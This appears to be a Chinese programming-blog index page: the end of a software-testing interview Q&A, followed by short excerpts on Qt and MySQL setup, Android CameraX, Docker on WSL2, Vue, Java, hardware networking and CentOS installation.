需求调查：全面了解系统概况、应用领域、软件开发周期、软件开发环境、开发组织、时间安排、功能需求、性能需求、质量需求及测试要求等。根据系统概况进行项目所需的人员、时间和工作量估计以及项目报价。
制定初步的项目计划。
测试准备：组织测试团队、培训、建立测试和管理环境等。
测试设计：按照测试要求进行每个测试项的测试设计，包括测试用例的设计和测试脚本的开发等。
测试实施：按照测试计划实施测试。
测试评估：根据测试的结果，出具测试评估报告。
13、你对SQA的职责和工作活动(如软件度量)的理解?
SQA就是独立于软件开发的项目组，通过对软件开发过程的监控，来保证软件的开发流程按照指定的CMM规程(如果有相应的CMM规程),对于不符合项及时提出建议和改进方案，必要时可以向高层经理汇报以求问题的解决。通过这样的途径来预防缺陷的引入，从而减少后期软件的维护成本。SQA主要的工作活动包括制定SQA工作计划，参与阶段产物的评审，进行过程质量、功能配置及物理配置的审计等;对项目开发过程中产生的数据进行度量等等。
14、说说你对软件配置管理的理解
项目在开发过程中要用相应的配置管理工具对配置项(包括各个阶段的产物)进行变更控制，配置管理的使用取决于项目规模和复杂性及风险的水平。软件的规模越大，配置管理就越显得重要。还有在配置管理中，有一个很重要的概念，那就是基线，是在一定阶段各个配置项的组合，一个基线就提供了一个正式的标准，随后的工作便基于此标准，并只有经过授权后才能变更这个标准。配置管理工具主要有CC，VSS,CVS,SVN等。
15、怎样写测试计划和测试用例
简单点，测试计划里应有详细的测试策略和测试方法，合理详尽的资源安排等，至于测试用例，那是依赖于需求(包括功能与非功能需求)是否细化到功能点，是否可测试等。
16、什么是兼容性测试?兼容性测试侧重哪些方面?
兼容测试主要是检查软件在不同的硬件平台、软件平台上是否可以正常的运行，即是通常说的软件的可移植性。
兼容的类型，如果细分的话，有平台的兼容，网络兼容，数据库兼容，以及数据格式的兼容。
兼容测试的重点是，对兼容环境的分析。通常，是在运行软件的环境不是很确定的情况下，才需要做兼容。根据软件运行的需要，或者根据需求文档，一般都能够得出用户会在什么环境下使用该软件，把这些环境整理成表单，就得出做兼容测试的兼容环境了。
兼容和配置测试的区别在于，做配置测试通常不是Clean OS下做测试，而兼容测试多是在Clean OS的环境下做的。
17、我现在有个程序，发现在Windows上运行得很慢，怎么判别是程序存在问题还是软硬件系统存在问题?
–1、检查系统是否有中毒的特征；
–2、检查软件/硬件的配置是否符合软件的推荐标准；
–3、确认当前的系统是否是独立，即没有对外提供什么消耗CPU资源的服务；
–4、如果是C/S或者B/S结构的软件，需要检查是不是因为与服务器的连接有问题，或者访问有问题造成的；
–5、在系统没有任何负载的情况下，查看性能监视器，确认应用程序对CPU/内存的访问情况。
18、测试的策略有哪些?
黑盒/白盒，静态/动态## 标题，手工/自动，冒烟测试，回归测试，公测(Beta测试的策略)
19、你觉得bugzilla在使用的过程中，有什么问题？
–界面不稳定；
–根据需要配置它的不同的部分，过程很烦琐；
–流程控制上，安全性不好界定，很容易对他人的Bug进行误操作；
–没有综合的评分指标，不好确认修复的优先级别。
20、描述测试用例设计的完整过程?
–1、需求分析 + 需求变更的维护工作；
–2、根据需求得出测试需求；
–3、设计测试方案，评审测试方案；
–4、方案评审通过后，设计测试用例，再对测试用例进行评审。
自动化测试相关教程推荐： 2023最新自动化测试自学教程新手小白26天入门最详细教程,目前已有300多人通过学习这套教程入职大厂！！_哔哩哔哩_bilibili 2023最新合集Python自动化测试开发框架【全栈/实战/教程】合集精华，学完年薪40W+_哔哩哔哩_bilibili 测试开发相关教程推荐 2023全网最牛，字节测试开发大佬现场教学，从零开始教你成为年薪百万的测试开发工程师_哔哩哔哩_bilibili postman/jmeter/fiddler测试工具类教程推荐 讲的最详细JMeter接口测试/接口自动化测试项目实战合集教程，学jmeter接口测试一套教程就够了！！_哔哩哔哩_bilibili 2023自学fiddler抓包，请一定要看完【如何1天学会fiddler抓包】的全网最详细视频教程！！_哔哩哔哩_bilibili 2023全网封神，B站讲的最详细的Postman接口测试实战教学，小白都能学会_哔哩哔哩_bilibili 总结： 光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。 如果对你有帮助的话，点个赞收个藏，给作者一个鼓励。也方便你下次能够快速查找。
如有不懂还要咨询下方小卡片，博主也希望和志同道合的测试人员一起学习进步
在适当的年龄，选择适当的岗位，尽量去发挥好自己的优势。
我的自动化测试开发之路，一路走来都离不每个阶段的计划，因为自己喜欢规划和总结，
测试开发视频教程、学习笔记领取传送门！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f61dfaa89a0fbb8d715d9e3f3c9af86/" rel="bookmark">
			学习过程中的一些bug，最新的就加在最前面吧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vs2010+QT5.5.1 环境配置完之后，新建空项目，用QTdesigner打开UI界面，界面修改一定要Ctrl + S保存，然后编译单个的UI文件。不然还是之前的UI文件，没有更改。
ui-&gt;控件，点不出来爆红就重新关掉IDE再打开工程。
0.QT连接MySQL的问题 加库文件
项目编译后的debug和release目录下也加入库文件
cmd管理员登录
#登录 mysql -uroot -ppassword #选择数据库 use mysql; # 注意：如果是远程连接，请将'localhost'换成'%' ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '你的数据库密码'; #刷新权限 FLUSH PRIVILEGES; 再用QT连接测试没问题了。
1.字体显示太大不适配的问题 点亮度
选择从不锁屏，个人习惯
点显示，进去选择自己合适的一个分辨率，缩放比例，看起来舒服一点，点应用生效，下次开机就不会显示异常了。
2.复制粘贴键使用不了了 安装VMware-tools工具，找到自己的Ubuntu的路径下，把后缀名.lck的文件全删掉，问题解决。
3.虚拟机扩容，有点小麻烦，给大家推荐一篇好用的博客，亲测可用。 VMware虚拟机扩容磁盘，有很详细图文_拿破仑的海阔天空的博客-CSDN博客
移植的时候注意检查开发板连接状态，千万别接反了，很容易烧了，开发板烧了会明显发烫，有嗡嗡的电流声，串口打印乱码。USB无法识别换个接口重新插拔几次就可以了。注意步骤顺序，不要急躁。
4.网线直连开发板电脑无法识别 本次使用的是MP157a，烧写镜像的时候注意开发板式v2还是v3版本的，
查询开发板IP的时候有网卡eth0，没有ipv6 netaddr,可能是由于网线问题，默认v3版本用的是千兆网线，换根百兆网线就没问题了，能正常识别。
5.无线连接方法 ipconfig 查询Windows的IPv4网关 2.查看Windows的网络适配器，对应的名字
3.虚拟机ubuntu的虚拟网络设置选择对应的
4.虚拟机新建一个网络连接，设置成同一网段的就行
5.虚拟机ping开发板，有回复，就不用网线了，但是速度相对于网线可能慢一点，对于学习来说够用。
6.qt交叉编译的问题 Linux下的qt是没有qcharts和qtexttospeech模块的。
出现下图这个错误，要先将开发板原有的界面关闭，才能显示新的界面。命令（psplash-drm-quit）。还有就是明明代码没改，第一次能运行，第二次、第三次、甚至运行不了，出现错误的时候，重启虚拟机解决。或者把工程重新配置编译一下。构建的目录删除，重新编译。资源显示问题也可以这样解决。问题很多，需要自己慢慢摸索。
qt部署项目时，出现以上情况，串口突然报一大堆错，重启一下开发板解决。(原因未知)
编译项目的时候卡退了。
不用网线连接，qt交叉编译很慢，要一两分钟；网线连接的话，十几秒就行了，效率高的多。
7.使用mqtt时，开发板是需要连接网络的。 不然无法进行通信。关闭VPN，不然是登录不上的。
8.开发板的文件名不能含有中文 含中文的文件打开时会报错，解析不了出问题。
9.Qt5.14版本和Qt5.9的版本资源文件编译问题 Qt5.9版本的资源文件可以是中文，但是Qt5.14版本的资源文件不能是中文，会编译报错，如下图
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/029ed52f4bc841f5d4528c58f95fbb9c/" rel="bookmark">
			Android CameraX适配Android13的踩坑之路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AndroidCameraX适配Android13的踩坑之路 前言： 最近把AGP插件升级到8.1.0，新建项目的时候目标版本和编译版本都是33，发现之前的demo使用Camerax拍照和录像都失败了，于是查看了一下官网和各种资料，找到了Android13的适配方案.
行为变更：以 Android 13 或更高版本为目标平台的应用 与早期版本一样，Android 13 包含一些行为变更，这些变更可能会影响您的应用。以下行为变更仅影响以 Android 13 或更高版本为目标平台的应用。如果您的应用以 Android 13 或更高版本为目标平台，您应该修改自己的应用以适当地支持这些行为（如果适用）。
此外，请务必查看对 Android 13 上运行的所有应用都有影响的行为变更列表。
细化的媒体权限 该对话框的两个按钮，从上至下分别为“Allow”和“Don’t allow”
图 1. 您在请求 READ_MEDIA_AUDIO 权限时向用户显示的系统权限对话框。
如果您的应用以 Android 13 或更高版本为目标平台，并且需要访问其他应用已经创建的媒体文件，您必须请求以下一项或多项细化的媒体权限，而不是READ_EXTERNAL_STORAGE 权限：
媒体类型请求权限图片和照片READ_MEDIA_IMAGES视频READ_MEDIA_VIDEO音频文件READ_MEDIA_AUDIO 如果用户之前向您的应用授予了 READ_EXTERNAL_STORAGE 权限，系统会自动向您的应用授予细化的媒体权限。否则，当应用请求上表中显示的任何权限时，系统会显示面向用户的对话框。在图 1 中，应用请求 READ_MEDIA_AUDIO 权限。
如果您同时请求 READ_MEDIA_IMAGES 权限和 READ_MEDIA_VIDEO 权限，系统只会显示一个系统权限对话框。
1.参考资料如下: https://developer.android.google.cn/about/versions/13/features?hl=zh-cn
https://blog.csdn.net/as425017946/article/details/127530660
https://blog.csdn.net/guolin_blog/article/details/127024559
2.依赖导入： 这里的依赖都是基于AGP8.1.0，Android Studio的插件版本 Gifaffe 2022.3.1
2.1 添加统一的CameraX依赖配置: 在项目的gradle目录下新建libs.version.toml文件
2.2 添加CameraX依赖： [versions] agp = "8.1.0" org-jetbrains-kotlin-android = "1.8.0" core-ktx = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/029ed52f4bc841f5d4528c58f95fbb9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd99666cd06b6dfac541c6a3c7fbcbae/" rel="bookmark">
			arm版linux安装mysql8
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官网下载：https://downloads.mysql.com/archives/community/
上传到服务器，然后解压缩
sudo tar -zxvf mysql-8.0.31-linux-glibc2.17-aarch64.tar.gz
sudo mv mysql-8.0.31-linux-glibc2.17-aarch64 /usr/local/mysql-8
先安装libaio1
sudo apt-get install libaio1
创建MySQL数据目录
sudo mkdir -p /data
cd /data
sudo mkdir -p mysql
生成编辑配置文件
sudo vim /etc/my.cnf
[mysqld] bind-address=0.0.0.0 port=3306 user=root basedir=/usr/local/mysql-8 datadir=/data/mysql socket=/tmp/mysql.sock log-error=/data/mysql/mysql.err pid-file=/data/mysql/mysql.pid #character config character_set_server=utf8mb4 lower_case_table_names=1 symbolic-links=0 初始化MYSQL
cd /usr/local/mysql-8/bin/
sudo ./mysqld --defaults-file=/etc/my.cnf --basedir=/usr/local/mysql-8/ --datadir=/data/mysql/ --user=mysql --initialize
查看初始密码
cat /data/mysql/mysql.err
启动mysql
cp /usr/local/mysql-8/support-files/mysql.server /etc/init.d/mysql
查看mysql服务状态 /etc/init.d/mysql status
启动 service mysql start
(如果启动失败，重启电脑后再启动mysql服务)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd99666cd06b6dfac541c6a3c7fbcbae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04e7e52486d3d66d09537d497bda1666/" rel="bookmark">
			web前端 六
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		web前端 六 Flex弹性盒模型flex-directionflex-wrapflex-flowjustify-contentalign-itemsalign-content 作用在flex子项上的css属性flex案例Grid网格布局作用在grid容器上grid-template-columns和grid-template-rowsgrid-template-areas和grid-templategrid-column-gap和grid-row-gapjustify-items和align-itemsjustify-content和align-content 作用在grid子项上的css属性骰子 JavaScriptJS的HelloworldJS编写的位置 JS基本语法字面量或变量标识符字符串强制类型转换其他进制的数字算数运算符一元运算符自增自减逻辑运算符非布尔值的与或运算赋值运算符关系运算符unicode编码表相等运算符条件运算符 Flex弹性盒模型 flex布局，可简便，完整，响应式的实现各种布局
这里
是引用
没加display：flex前
加了后
flex-direction 控制子项整体布局方向
row 默认值显示为行。方向为当前文档水平流方向，默认情况是从左往右 row-reverse 显示为行，但方向和row属性值相反 #box{width: 400px;height: 200px;border:1px black solid;margin:20px auto;display: flex;flex-direction:row-reverse} #box div{width: 100px;height: 50px; color:beige;background: blueviolet;line-height: 60px;text-align: center;} &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="box"&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;4&lt;/div&gt; &lt;div&gt;5&lt;/div&gt; &lt;/div&gt; column 显示为列 #box{width: 400px;height: 200px;border:1px black solid;margin:20px auto;display: flex;flex-direction:column} #box div{width: 100px;height: 50px; color:beige;background: blueviolet;line-height: 60px;text-align: center;} &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="box"&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;4&lt;/div&gt; &lt;div&gt;5&lt;/div&gt; &lt;/div&gt; column-reverse 显示为列。方向和column属性相反
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/04e7e52486d3d66d09537d497bda1666/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2dc887c1471779bce53928e3bc3fd1cc/" rel="bookmark">
			wsl2/Ubuntu安装docker遇到的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.sudo apt-get install docker-ce报错 wsl2版本有更新，可以到docker官网下载Install Docker Engine on Ubuntu | Docker Docs
*docker官网下载在wsl2上好像有问题，参考Install Docker on WSL2 - DEV Community下载
2.docker启动有问题，拉取镜像失败 dockerd前台运行一下发现问题：
sudo dockerd 发现是iptables规则的问题：
查看iptables规则：
清除iptables规则：
仍然报错：浏览器搜索该报错：
sudo sysctl -w net.ipv4.ip_forward=1
cat /etc/sysctl.conf |grep net.ipv4.ip_forward
sudo sed -i '/net.ipv4.ip_forward/ s/\(.*= \).*/\11/' /etc/sysctl.conf
cat /etc/sysctl.conf |grep net.ipv4.ip_forward
sudo vim /etc/sysctl.conf
cat /etc/sysctl.conf |grep net.ipv4.ip_forward
sudo dockerd
sudo update-alternatives --set iptables /usr/sbin/iptables-legacy
至此，成功解决！
3.docker自启动 在~/.bashrc或~/.zshrc添加以下内容：
sudo service docker status &gt;&gt; /dev/null || sudo service docker start
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2dc887c1471779bce53928e3bc3fd1cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27cb7becd2e1628bd62d63b3021a9dd4/" rel="bookmark">
			[PTA]平均之上
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		输入一个整数n，再输入n个成绩，求大于平均分的成绩个数。
例如，输入5 68 79 56 95 88，输出3。
输入格式: 首先输入一个正整数T，表示测试数据的组数，然后是T组测试数据。
每组测试先输入n，表示数据个数，然后输入n个整数。
输出格式: 对于每组测试，输出大于平均分的成绩个数。
输入样例: 输出样例: /*注：其实这道题不用指针还要简单些，但为了熟悉指针就用的这种 方式，如果还没有学习指针就不要用这种来*/ #include&lt;stdio.h&gt; int function(int* f, int k);//被调用函数：对数字求平均值并输出大于平均值的数字个数 int main() { int n = 0;//接收组数 int A[1000][1000] = { 0 };//每行代表一组数字(不含第一个数字即数字个数) scanf("%d", &amp;n); for (int i = 0; i &lt; n; i++) { int count = 0;//用于接收大于平均值数的个数 int k = 0; scanf("%d", &amp;k); for (int j = 0; j &lt; k; j++) { scanf("%d", &amp;A[i][j]); } count = function(A[i], k);//A[i]即i行首个元素的地址 printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27cb7becd2e1628bd62d63b3021a9dd4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61e105ee1dcf461868ce5482171f2e03/" rel="bookmark">
			javaweb搭配ajax和json
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ajax一般用来前端界面与后端界面交互使用。数据格式一般使用json，优点是便于对象与字符串的转化。
1.不适用json对象封装。 jsp:
&lt;script&gt; $.ajax({ url: "/LoginServlet", data: {"name":name, "pwd":password}, dataType: "json", type: "post", success: function (result) { if (result.code == "200") { alert(result.msg); } } }) &lt;/script&gt; 后端：
String json1 = "{\"code\":200, \"message\":\"访问成功\"}"; out.print(json1); 2.使用json对象封装json格式化。 首先导入 fastjson-1.1.13.jar lib库。
这是json格式化代码，这个方法在我们刚导入的jar包中：
public String toJSONString(){
JSONObject jsonObject=new JSONObject();
return jsonObject.toJSONString(this);
}
加一层封装，这是一个工具类，用到了泛型：
package com.hz.utils; import com.alibaba.fastjson.JSONObject; public class JsonMessage&lt;E&gt; { private String code;//状态码 private String msg;//状态码描述信息 private E data;//数据 public String getCode() { return code; } public void setCode(String code) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61e105ee1dcf461868ce5482171f2e03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e8b1f5a53e69890a030a202c8f1cb02/" rel="bookmark">
			简洁应用框架VSEF的架构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文介绍了一些简洁架构VSEF的一些框架结构理解，并且抛出了一些演化的主题，这些主题的不同思考会让系统发展成不同的风格，实际也是应用定位的必然结果。
总体
VSEF 架构理念 = 基本结构 + 演化
基本结构 = 入口 + 内核 + 依赖
内核= 简单逻辑 + 复杂流程
简单逻辑 = 业务脚本 + 能力执行
复杂流程 = 流程编排 + 节点衔接 + 能力（任务）执行
演化 = 主题讨论 + 组件选取（市场组件优先）
﻿
VSEF 总体结构
核心架构
架构 = 组成要素 + 关系 + 设计/演化原则
▐ 入口 VSEF 观点：入口要清晰明确
就像 “要理清乱了的线团，就要找到线头一样”，将入口放在一个完整的目录，或者模块中的好处是：可以快速地功能总览，了解“提供哪些服务”、“接收那些消息”、“实现哪些任务”。
这里的目录类型有：
服务 service : 对外提供的 rpc 服务， 如HSF。这个一般会搭配一个服务 client 可调用者使用。
消息 message：可以再区分 metaq 和 notify 目录。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e8b1f5a53e69890a030a202c8f1cb02/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f55693c77de896b477299c733b5ee957/" rel="bookmark">
			利用Java基础知识&#43;简单封装写一个银行登录存取款系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 🐒个人主页🏅JavaSE系列专栏📖前言：🎀 思路构建总结：🧸变量信息🏅1. 设计登录交互界面🎇2. 验证账户密码是否正确🪀3. 写出（1.查看存款余额 2.存款3.取款4.退出 5.修改密码）方法🍉4. 再写出一个循环方法（将1，2，3，4，5方法嵌套） 🎯源代码（用户）🎯源代码（封装隐藏ChinaBank类信息） 🐒个人主页 🏅JavaSE系列专栏 📖前言： 本篇博客主要以介绍入门级java如何实现(简化版)银行登录存取款系统
🎀 思路构建总结： 设计登录交互界面验证账户密码是否正确写出（1.查看存款余额 2.存款3.取款4.退出 ）方法再写出一个循环方法（将1，2，3，4，5方法嵌套）
5.新增了一个修改密码的功能，代码有略微改动
（注：需要用到静态块。）具体效果如下（下面有代码）： 🧸变量信息 static String BankName = "中国人民银行";// String account = "1234567";//账户 String password = "1314521";//密码 int money = 1000000;//我的银行余额o(*￣︶￣*)o boolean MY = register();//登录方法返回值判断账户密码是否正确 🏅1. 设计登录交互界面 static {//静态块--初始界面 System.out.println("————————欢迎来到" + BankName + "——————————"); System.out.println(); } public ChinaBank() {//用户登录成功界面 System.out.println("————————欢迎来到" + BankName + "——————————"); System.out.println(); System.out.println("\t\t1.查看余额"); System.out.println("\t\t2.存款"); System.out.println("\t\t3.取款"); System.out.println("\t\t4.退出"); System.out.println("\t\t5.修改密码"); System.out.println("\t\t请输入选项1，2，3，4，5以便进行操作："); } public void menu(){ System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f55693c77de896b477299c733b5ee957/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60673c123ca926283189eddbd8fc5b75/" rel="bookmark">
			renren-fast-vue 项目部署以及install问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装nodejs，这里推荐按照本教程来，在项目部署过程中会遇到npm install失败报err问题，问题基本上是node-sass版本太高，nodejs与node-sass版本需要对应
我本地安装的node版本为：
v14.21.3
npm版本为：
6.14.18
附上链接地址：https://registry.npmmirror.com/-/binary/node/latest-v14.x/node-v14.21.3-x64.msihttps://registry.npmmirror.com/-/binary/node/latest-v14.x/node-v14.21.3-x64.msi2、git 下载项目
git clone https://gitee.com/renrenio/renren-fast-vue.git npm install
2.1报错Failed at the chromedriver@2.27.2 install script，缺少模块，运行以下命令：
npm install chromedriver@2.27.2 --ignore-scripts 2.2报错Module build failed: Error: Cannot find module 'node-sass'，运行以下命令：
npm i node-sass --sass_binary_site=https://npm.taobao.org/mirrors/node-sass/ npm install
npm run dev
成功！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff08fb9fe6e4853bb0d4ec5fd96d846e/" rel="bookmark">
			VUE中如果让全局组件在某一页面不显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
方法一 1.在全局组件中添加一个变量用于控制显示与隐藏。
2.在全局组件的模板中使用 v-if 条件来决定是否显示该组件
3.在不需要显示全局组件的页面中，修改 showGlobalComponent 变量的值为 false，以隐藏全局组件。
4.在需要隐藏全局组件的页面中，调用 hideGlobalComponent 方法来修改 showGlobalComponent 的值。可以在钩子函数（如 created 或 mounted）或任何其他适合的地方调用该方法。
方法二（更简单的方法） 1.通过在组件的模板中使用 v-if来控制组件在某个页面中的显示与隐藏
2.给路由设置自定义字段，用来存储额外的路由信息
效果
全局效果
设置的页面 前言 在使用 Vue 开发项目时，为了提高开发效率和减少重复代码，我们通常会使用全局组件。全局组件能够在整个项目的各个页面中使用，使得组件的复用更加方便。然而，有时候我们在某个页面中可能不希望显示全局组件。本篇文章将介绍如何在设置了全局组件的情况下，在某个页面中不显示全局组件，优化项目的组件加载和页面渲染。
方法一 在 Vue 中，我们可以使用组件的 v-if 指令来控制组件的显示和隐藏。通过在某个页面的组件上添加 v-if 指令，我们可以根据需要决定是否显示该组件。以下是具体的操作步骤：
1.在全局组件中添加一个变量用于控制显示与隐藏。 可以使用 Vue 的 data 属性来存储该变量，并设置初始值为 true（表示显示）。例如：
data() { return { showGlobalComponent: true }; }, 2.在全局组件的模板中使用 v-if 条件来决定是否显示该组件 &lt;template&gt; &lt;div v-if="showGlobalComponent"&gt; &lt;!-- 全局组件内容 --&gt; &lt;/div&gt; &lt;/template&gt; 3.在不需要显示全局组件的页面中，修改 showGlobalComponent 变量的值为 false，以隐藏全局组件。 methods: { hideGlobalComponent() { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ff08fb9fe6e4853bb0d4ec5fd96d846e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41211ad627b7be07d79b7710c1690405/" rel="bookmark">
			java BigDecimal 类型求和: reduce(BigDecimal.ZERO, BigDecimal::add)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 做营收/银行类的交易系统，会经常和金钱打交道，也避免不了对“钱”进行计算，最常用的就是金额相加
不废话，上代码，下面这个笔者在做营收系统的时候用的比较多
// 对污水费用进行求和，使用reduce(BigDecimal.ZERO, BigDecimal::add) 流式处理 BigDecimal feeChargeSum = feeChargeList.stream().map(AccountCharge::getCaPrice).reduce(BigDecimal.ZERO, BigDecimal::add); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/337c105c62f531db9d5f861ae715e5e1/" rel="bookmark">
			服务器跑pytorch代码，GPU显存正常但是利用率为0？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		根本问题：num_workers=32，可能是过高
解决方法：将num_workers调整至8，一切恢复正常 导致 GPU 利用率为 0 的情况可能有几个原因：
CPU 瓶颈：设置过高的 num_workers 可能导致 CPU 资源过度竞争，尤其是在数据加载和预处理过程中。这可能会使 CPU 无法及时处理数据并将其发送到 GPU，从而造成 GPU 空闲等待数据，导致 GPU 利用率为 0。
IO 瓶颈：过多的 num_workers 也可能导致 IO 资源的竞争，尤其是在从磁盘读取数据时。如果系统 IO 能力有限，设置过多的 num_workers 可能会导致数据读取速度受限，进而影响到 GPU 的数据获取速度。
系统资源竞争：除了 CPU 和 IO，过高的 num_workers 还可能导致系统内存和其他资源的竞争，从而影响整体系统的稳定性和性能
更新
只改变num_workers问题没有解决，还需要将pin_memory设置为False
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb0ea28152787931b566e6069d4e6b3a/" rel="bookmark">
			示波器_使用手册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DS1102E 1&gt; 概述1.1&gt; 功能1.2&gt; 带宽1.3&gt; 采样率1.4&gt; 存储深度1.5&gt; 技术规格 2&gt; 显示区域3&gt; MENU 常用菜单3.1&gt; Measure 自动测量3.2&gt; Acquire 采样设置 4&gt; VERTICAL 垂直控制4.1&gt; 通道设置 CH1 / CH24.2&gt; Position 垂直位置4.2&gt; Scale 垂直档位 5&gt; VERTICAL 水平控制5.1&gt; Position 水平位置5.2&gt; Scale 水平档位5.3&gt; MENU 功能菜单 6&gt; TRIGGER 触发控制6.1&gt; LEVEL 触发电平6.2&gt; MENU 功能菜单6.3&gt; 触发设置 7&gt; 常用功能7.1&gt; 时钟测量7.1.1&gt; 8M晶振测量_方法17.1.2&gt; 8M晶振测量_方法2 7.2&gt; RIGOL DS1102E保存波形到U盘7.2.1&gt; U盘格式：7.2.2&gt; 保存文件：7.2.3&gt; 文件分析： 7.3&gt; 捕获us级脉冲边沿 8&gt; 视频链接（5个实例） 1&gt; 概述 1.1&gt; 功能 波形举例：
示波器：测量电压随时间变化的波形。
1.2&gt; 带宽 示波器可测
信号，最高频率， 如【100MHz】
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb0ea28152787931b566e6069d4e6b3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e3711ec3e8a7715b0a5701cb6e1a379/" rel="bookmark">
			char[]数组转string注意事项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		char strProcPath[128];
string str;
str=strProcPath;
当在这种情况直接进行赋值，有可能会报C6054缺少'\0'结束符。
这种情况下可以对char strProcPath[128]{'\0'}; 初始化时进行\0字符赋值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc4a98004d59fe20b1e3539926270944/" rel="bookmark">
			rk3568 RGMII KSZ8795 MAC TO MAC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RK3568与KSZ8795交换机芯片连接，直接MAC TO MAC方式，这样一下就扩展会4路网口，应该场合比较多，移植过程如下：
参考《Rockchip_Developer_Guide_Linux_MAC_TO_MAC_CN.pdf》
《rockchip RGMII+mv88e6390 管理型交换机功能调试及vlan定制+Mac绑定_marvel 88e6390分配ip-CSDN博客》
《Linux内核（五） [ RK3568 ] PHY驱动框架解析 —— MDIO总线-CSDN博客》
物理连接 RMII 直连如下所示，其中 RX_ERR 需要接地。
MAC0 --RMII-- MAC1
TXD[1:0] -------- RXD[1:0]
TX_EN -------- RX_DV
REF_CLK -------- REF_CLK
RXD[1:0] -------- TXD[1:0]
RX_DV -------- TX_EN
RX_ERR -------- GND
GND -------- RX_ERR
时钟配置 50OHM_GMAC1_TXCLK_M1， 50OHM_GMAC1_RXCLK_M1这2个引脚上都有时钟信号，TX是RK3568生成的，TXCLK是KSZ8795生成的，一定要确认是125MHZ，示波器可以观察到。
clk=2.5Mhz为10M网络；
clk=25Mhz为100M网络；
clk=125Mhz为千兆网络；
DTS 设备树文件修改。设置固件连接，1000兆，全双工，如下 ：
tx_delay = &lt;0x2f&gt;;
rx_delay = &lt;0x0a&gt;;
/*phy-handle = &lt;&amp;rgmii_phy1&gt;;*/
status = "ok";
fixed-link{
speed = &lt;1000&gt;;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc4a98004d59fe20b1e3539926270944/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c547c3c8e73b9087f7fe0d8fd092676/" rel="bookmark">
			CentOS 7.9安装和更新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面：本文将从镜像下载、安装、首次更新系统。
一、安装前的准备 CentOS7.9镜像文件下载地址：https://wiki.centos.org/Download
点击mirros链接，进入镜像列表，如下图：
